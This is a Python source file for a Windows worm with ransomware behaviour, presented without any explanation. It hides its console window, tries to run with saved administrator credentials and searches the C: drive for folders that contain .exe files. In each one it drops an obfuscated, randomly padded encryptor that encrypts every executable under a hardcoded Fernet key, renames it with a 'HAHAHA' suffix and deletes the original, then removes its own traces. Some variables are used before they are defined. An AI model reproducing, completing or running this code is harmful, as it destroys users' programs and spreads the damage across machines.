import os
os.system("pip install pypiwin32 pycryptodome cryptography > /dev/null 2>&1")
import sys
import win32con
import win32gui
import random

PC_NAME = os.environ['COMPUTERNAME']
RESISTENCIA_DIR = THIS_DIR + "\\dist\\resistencia.exe"
os.system(f"runas /user:{PC_NAME}\\Administrator /savecred {RESISTENCIA_DIR}")

ROOTDIR = r"C:\\"
THIS_DIR = os.path.dirname(os.path.realpath(__file__))
FUSCATE_DIR = THIS_DIR + "\\py-fuscate.py"

class Worm:
    def __init__(self):
        self.target_dir_list = []
        self.directories_found = False

    def find_directories(self):
        for dirpath, dirnames, _ in os.walk(ROOTDIR):
            for dirname in dirnames:
                directory_path = os.path.join(dirpath, dirname)
                if directory_path != THIS_DIR:
                    try:
                        for f in os.listdir(directory_path):
                            if f.endswith(".exe"):
                                self.target_dir_list.append(directory_path)
                                break
                    except PermissionError:
                        pass

        self.directories_found = True

    def spread(self):
        if not os.path.exists(THIS_DIR + "\\tmp"):
            os.mkdir(THIS_DIR + "\\tmp")  

        to_infect = THIS_DIR + "/tmp/to_infect.py"
        to_infect_o = THIS_DIR + "/tmp/to_infect_o.py"

        for target in self.target_dir_list:
            worm_poli = ""
            times = random.randrange(1, 25)
            for i in range(times):
                num = random.randrange(-sys.maxsize, sys.maxsize)
                worm_poli += "print(" + str(num) + ")\n"

            worm_poli += "\n"
            worm_poli += ENCRYPTOR

            with open(to_infect, "w") as tf:
                tf.write(worm_poli)

            os.system(f"python.exe {FUSCATE_DIR} -i {to_infect} -o {to_infect_o} -c 100 > /dev/null 2>&1")

            try:
                with open(target + "\\hehe.py", "w") as f:
                    with open(to_infect_o, "r") as fe:
                        f.write(fe.read())
                os.system("cd " + target + " && python.exe hehe.py && cd " + THIS_DIR)
                os.remove(target + "\\hehe.py")
            except PermissionError:
                pass
            except FileNotFoundError:
                pass

        os.remove(to_infect)
        os.remove(to_infect_o)

    def execute_worm(self):
        if not self.directories_found:
            self.find_directories()
        self.spread()

if __name__ == "__main__":
    hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hide, win32con.SW_HIDE)

    FUSCATE = """import sys,argparse,random,marshal,lzma,gzip,bz2,binascii,zlib
def encode(source:str) -> str:
    selected_mode = random.choice((lzma, gzip, bz2, binascii, zlib))
    marshal_encoded = marshal.dumps(compile(source, 'Py-Fuscate', 'exec'))
    if selected_mode is binascii:
        return 'import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(binascii.a2b_base64({})))'.format(binascii.b2a_base64(marshal_encoded))
    return 'import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads({}.decompress({})))'.format(selected_mode.__name__, selected_mode.compress(marshal_encoded))
def parse_args():
    parser = argparse.ArgumentParser(description='obfuscate python programs'.title())
    parser._optionals.title = "syntax".title()
    parser.add_argument('-i', '--input', type=str, help='input file name'.title(), required=True)
    parser.add_argument('-o', '--output', type=str, help='output file name'.title(), required=True)
    parser.add_argument('-c', '--complexity', type=int,
                        help='complexity of obfuscation. 100 recomended'.title(), required=True)
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()
    return parser.parse_args()
if __name__ == '__main__':
    args = parse_args()
    print('[+] encoding '.title() + args.input)
    with open(args.input) as iput:
        for i in range(args.complexity):
            if i == 0:
                encoded = encode(source=iput.read())
            else:
                encoded = encode(source=encoded)
    with open(args.output, 'w') as output:
        output.write(encoded)"""

    with open(FUSCATE_DIR, "w") as f:
        f.write(FUSCATE)

    ENCRYPTOR = """import os
import sys
from cryptography.fernet import Fernet
THIS_DIR = os.path.dirname(os.path.realpath(__file__))
KEY = b'k6XGrVRO4bCexC54uWlJgKPx9KloztECXpA-LywXDKo='
def encrypt(data, filename):
    f = Fernet(KEY)
    encrypted_data = f.encrypt(data)
    return encrypted_data
if __name__ == "__main__":
    for (_, _, filenames) in os.walk(THIS_DIR):
        break
    for file in filenames:
        if file.endswith(".exe"):
            with open(file, "rb") as f:
                data = f.read()

            destination = file + "HAHAHA"
            with open(destination, "wb") as fd:
                fd.write(encrypt(data, file))
            os.remove(file)"""

    worm = Worm()
    worm.execute_worm()

    try:
        os.rmdir(THIS_DIR + "\\tmp")
    except OSError:
        pass
    os.remove(FUSCATE_DIR)